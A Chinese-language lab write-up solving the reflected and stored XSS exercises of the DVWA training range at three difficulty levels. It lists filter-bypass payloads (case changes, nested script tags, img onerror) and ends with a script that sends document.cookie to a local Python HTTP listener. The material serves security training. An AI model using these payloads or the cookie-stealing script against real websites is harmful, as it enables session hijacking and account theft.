## 1.完成dvwa靶场中针对反射型XSS的低中高难度的注入。

### 低难度

![image-20221111142115847](http://bex-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221111142115847.png)

#### payload

```
1<script>alert("hi")</script>
```

![image-20221111142041352](http://bex-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221111142041352.png)

### 中难度

![image-20221111142106867](http://bex-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221111142106867.png)

对<script>字符串做了校检

![image-20221111142304049](http://bex-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221111142304049.png)



#### payload

```
1<Script>alert("hi")</script>
```

![image-20221111142157587](http://bex-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221111142157587.png)

```
1<scr<script>ipt>alert("hi")</script>
```

![image-20221111142213639](http://bex-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221111142213639.png)

### 高难度

![image-20221111142335213](http://bex-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221111142335213.png)

查看源码使用正则表达式对script进行了过滤

![image-20221111143016640](http://bex-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221111143016640.png)

#### payload

使用img+onerror进行注入

```
1<img src=1 onerror=alert("hi")>
```

![image-20221111143241688](http://bex-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221111143241688.png)

## 2.完成dvwa靶场中针对存储型XSS的低中高难度的注入。

### 低难度

![image-20221111142115847](http://bex-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221111142115847.png)

#### payload

```
1<script>alert("hi")</script>
```

![image-20221111143640661](http://bex-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221111143640661.png)

![image-20221111143652390](http://bex-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221111143652390.png)

### 中难度

![image-20221111142106867](http://bex-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221111142106867.png)

阅读源码发现对messge进行了去除了html符号，对name替换了<script>为空

![image-20221111145140612](http://bex-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221111145140612.png)

![image-20221111145205611](http://bex-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221111145205611.png)

#### payload

使用name属性进行xss注入，需要先F12修改name框输入的最大长度

![image-20221111145304087](http://bex-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221111145304087.png)

```
1<s<script>cript>alert("hi")</script>
```

![image-20221111145327999](http://bex-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221111145327999.png)

注入成功

![image-20221111145421953](http://bex-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221111145421953.png)

### 高难度

![image-20221111142335213](http://bex-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221111142335213.png)

阅读源码发现对messge进行了去除了html符号，对name进行了正则替换

![image-20221111145552206](http://bex-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221111145552206.png)

#### payload

使用name属性进行img注入，需要先F12修改name框输入的最大长度

![image-20221111145730187](http://bex-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221111145730187.png)

```
1<img src=1 onerror=alert("hi")>
```

![image-20221111145753840](http://bex-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221111145753840.png)

注入成功

![image-20221111145858578](http://bex-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221111145858578.png)



## 3.利用XSS漏洞获取cookie实验

### 打开接收端

```
python3 -m http.server 1111
```

### 修改输入长度

![image-20221111152745214](http://bex-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221111152745214.png)

### payload

```
<script>document.write('<img src="http://127.0.0.1:1111/'+document.cookie+'"/>')</script>
```

![image-20221111152808325](http://bex-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221111152808325.png)

### 注入成功

![image-20221111152827733](http://bex-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221111152827733.png)

### 接收端收到cookie

![image-20221111152859274](http://bex-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221111152859274.png)